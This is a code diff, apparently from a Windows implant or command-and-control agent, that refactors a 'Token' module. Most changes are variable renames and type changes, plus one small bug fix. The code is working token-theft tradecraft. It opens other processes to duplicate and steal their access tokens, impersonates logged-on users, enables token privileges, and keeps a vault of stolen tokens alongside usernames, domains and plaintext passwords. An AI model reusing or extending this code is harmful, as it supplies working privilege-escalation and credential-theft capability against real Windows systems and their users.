@@ -4,94 +4,94 @@ namespace Token {
 	BOOL RevertToken() {
 		HEXANE
 
-		HANDLE hToken = { };
-		if (NT_SUCCESS(ntstatus = Ctx->Nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &hToken, sizeof(HANDLE)))) {
+		HANDLE token = { };
+		if (NT_SUCCESS(ntstatus = Ctx->Nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &token, sizeof(HANDLE)))) {
 			return TRUE;
 		}
 
 		return FALSE;
 	}
 
-	BOOL TokenImpersonate(BOOL Impersonate) {
+	BOOL Tokenimpersonate(bool impersonate) {
 		HEXANE
 
-		BOOL Success = FALSE;
-		if (Impersonate && !Ctx->Tokens.Impersonate && Ctx->Tokens.Token) {
+		BOOL success = FALSE;
+		if (impersonate && !Ctx->Tokens.Impersonate && Ctx->Tokens.Token) {
 			if (!(Ctx->Tokens.Impersonate = Ctx->win32.ImpersonateLoggedOnUser(Ctx->Tokens.Token->Handle))) {
 				return_defer(ERROR_CANNOT_IMPERSONATE);
 			}
-		} else if (!Impersonate && Ctx->Tokens.Impersonate) {
+		} else if (!impersonate && Ctx->Tokens.Impersonate) {
 			Ctx->Tokens.Impersonate = FALSE;
-			Success = RevertToken();
+			success = RevertToken();
 
-		} else if (Impersonate && !Ctx->Tokens.Token) {
-			Success = TRUE;
-		} else if (Impersonate && Ctx->Tokens.Impersonate) {
-			Success = TRUE;
-		} else if (Impersonate && !Ctx->Tokens.Impersonate) {
-			Success = TRUE;
+		} else if (impersonate && !Ctx->Tokens.Token) {
+			success = TRUE;
+		} else if (impersonate && Ctx->Tokens.Impersonate) {
+			success = TRUE;
+		} else if (impersonate && !Ctx->Tokens.Impersonate) {
+			success = TRUE;
 		}
 
 		defer:
-		return Success;
+		return success;
 	}
 
-	VOID DuplicateToken(HANDLE orgToken, DWORD Access, SECURITY_IMPERSONATION_LEVEL Level, TOKEN_TYPE Type, PHANDLE newToken) {
+	VOID DuplicateToken(HANDLE orgToken, const uint32_t access, SECURITY_IMPERSONATION_LEVEL level, TOKEN_TYPE type, PHANDLE new_token) {
 		HEXANE
 
-		OBJECT_ATTRIBUTES Attrs				= { };
-		SECURITY_QUALITY_OF_SERVICE Sqos	= { };
+		OBJECT_ATTRIBUTES attrs				= { };
+		SECURITY_QUALITY_OF_SERVICE sqos	= { };
 
-		Sqos.Length				    = sizeof(SECURITY_QUALITY_OF_SERVICE);
-		Sqos.ImpersonationLevel     = Level;
-		Sqos.ContextTrackingMode	= 0;
-		Sqos.EffectiveOnly			= FALSE;
+		sqos.Length				    = sizeof(SECURITY_QUALITY_OF_SERVICE);
+		sqos.ImpersonationLevel     = level;
+		sqos.ContextTrackingMode	= 0;
+		sqos.EffectiveOnly			= FALSE;
 
-		InitializeObjectAttributes(&Attrs, nullptr, 0, nullptr, nullptr);
-		Attrs.SecurityQualityOfService = &Sqos;
+		InitializeObjectAttributes(&attrs, nullptr, 0, nullptr, nullptr);
+		attrs.SecurityQualityOfService = &sqos;
 
-		ntstatus = Ctx->Nt.NtDuplicateToken(orgToken, Access, &Attrs, FALSE, Type, newToken);
+		ntstatus = Ctx->Nt.NtDuplicateToken(orgToken, access, &attrs, FALSE, type, new_token);
 	}
 
-	VOID SetTokenPrivilege(LPWSTR Privilege, BOOL Enable) {
+	VOID SetTokenPrivilege(const wchar_t* privilege, bool enable) {
 		HEXANE
 
-		TOKEN_PRIVILEGES tokenPriv	= { };
-		HANDLE hToken 				= { };
-		LUID Luid 					= { };
+		TOKEN_PRIVILEGES token_priv	= { };
+		HANDLE token 				= { };
+		LUID luid 					= { };
 
-		if (!LookupPrivilegeValueW(nullptr, Privilege, &Luid)) {
+		if (!LookupPrivilegeValueW(nullptr, privilege, &luid)) {
 			return_defer(ERROR_PRIVILEGE_NOT_HELD);
 		}
 
-		tokenPriv.PrivilegeCount		= 1;
-		tokenPriv.Privileges[0].Luid	= Luid;
+		token_priv.PrivilegeCount		= 1;
+		token_priv.Privileges[0].Luid	= luid;
 
-		Enable
-		? tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
-		: tokenPriv.Privileges[0].Attributes = NULL;
+		enable
+		? token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+		: token_priv.Privileges[0].Attributes = NULL;
 
 		if (
-			!NT_SUCCESS(Ctx->Nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) ||
-			!Ctx->win32.AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, 0, nullptr, nullptr)) {
+			!NT_SUCCESS(Ctx->Nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &token)) ||
+			!Ctx->win32.AdjustTokenPrivileges(token, FALSE, &token_priv, 0, nullptr, nullptr)) {
 			return_defer(ERROR_INVALID_TOKEN);
 		}
 
 		defer:
 	}
 
-	HANDLE StealProcessToken(HANDLE hTarget, DWORD Pid) {
+	HANDLE StealProcessToken(HANDLE target, const uint32_t pid) {
 		HEXANE
 
 		HANDLE hProcess		= { };
 		HANDLE hDuplicate	= { };
 
-		if (!NT_SUCCESS(Process::NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, Pid))) {
+		if (!NT_SUCCESS(Process::NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, pid))) {
 			return_defer(ntstatus);
 		}
 
-		if (hTarget) {
-			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtDuplicateObject(hProcess, hTarget, NtCurrentProcess(), &hDuplicate, 0, 0, DUPLICATE_SAME_ACCESS))) {
+		if (target) {
+			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtDuplicateObject(hProcess, target, NtCurrentProcess(), &hDuplicate, 0, 0, DUPLICATE_SAME_ACCESS))) {
 				return_defer(ntstatus);
 			}
 		} else {
@@ -108,7 +108,7 @@ namespace Token {
 		return hDuplicate;
 	}
 
-	_token_list_data* GetToken(DWORD tokenId) {
+	_token_list_data* GetToken(const uint32_t tokenId) {
 		HEXANE
 
 		_token_list_data *head = Ctx->Tokens.Vault;
@@ -124,7 +124,7 @@ namespace Token {
 		return head;
 	}
 
-	DWORD AddToken(HANDLE token, LPWSTR username, SHORT type, DWORD pid, LPWSTR domain_user, LPWSTR domain, LPWSTR password) {
+	DWORD AddToken(HANDLE token, wchar_t* const username, const int16_t type, const uint32_t pid, wchar_t* const domain_user, wchar_t* const domain, wchar_t* const password) {
 		HEXANE
 
 		_token_list_data *head	= { };
@@ -149,7 +149,7 @@ namespace Token {
 
 		head = Ctx->Tokens.Vault;
 		while (head->Next) {
-			head = Head->Next;
+			head = head->Next;
 			Index++;
 		}
 
@@ -195,30 +195,30 @@ namespace Token {
 				}
 
 				if (entry->DomainUser) {
-					x_memset(entry->DomainUser, 0, x_wcslen(entry->DomainUser) * sizeof(WCHAR));
+					x_memset(entry->DomainUser, 0, x_wcslen(entry->DomainUser) * sizeof(wchar_t));
 					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->DomainUser);
 					entry->DomainUser = nullptr;
 				}
 
 				if (entry->lpUser) {
-					x_memset(entry->lpUser, 0, x_wcslen(entry->lpUser) * sizeof(WCHAR));
+					x_memset(entry->lpUser, 0, x_wcslen(entry->lpUser) * sizeof(wchar_t));
 					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpUser);
 					entry->lpUser = nullptr;
 				}
 
 				if (entry->lpDomain) {
-					x_memset(entry->lpDomain, 0, x_wcslen(entry->lpDomain) * sizeof(WCHAR));
+					x_memset(entry->lpDomain, 0, x_wcslen(entry->lpDomain) * sizeof(wchar_t));
 					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpDomain);
 					entry->lpDomain = nullptr;
 				}
 
 				if (entry->lpPassword) {
-					x_memset(entry->lpPassword, 0, x_wcslen(entry->lpPassword) * sizeof(WCHAR));
+					x_memset(entry->lpPassword, 0, x_wcslen(entry->lpPassword) * sizeof(wchar_t));
 					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpPassword);
 					entry->lpPassword = nullptr;
 				}
 
-				x_memset(entry, 0, sizeof(TOKEN_LIST_DATA));
+				x_memset(entry, 0, sizeof(_token_list_data));
 				Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry);
 
 				return TRUE;
